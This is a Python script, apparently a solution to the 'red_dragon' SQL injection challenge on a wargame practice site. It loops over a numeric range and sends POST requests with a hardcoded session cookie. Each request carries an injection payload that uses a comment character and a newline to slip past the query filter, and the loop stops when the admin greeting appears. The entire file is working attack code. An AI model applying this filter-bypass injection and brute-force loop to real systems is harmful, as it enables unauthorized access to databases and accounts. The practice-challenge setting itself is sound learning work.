import requests

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id="
session = {'PHPSESSID':'1pnndupij0939bhhc7o1etb71b'}
payload2 = ""


for i in range(586482000,600000001): 
        payload="%27||no=%23&no=%0a"+str(i)
        #print(str(i)+" payload = "+url+payload)
        
        request = requests.post(url+payload, cookies=session)
        if "Hello admin" in request.text:
            break


print("DONE!!"+payload)

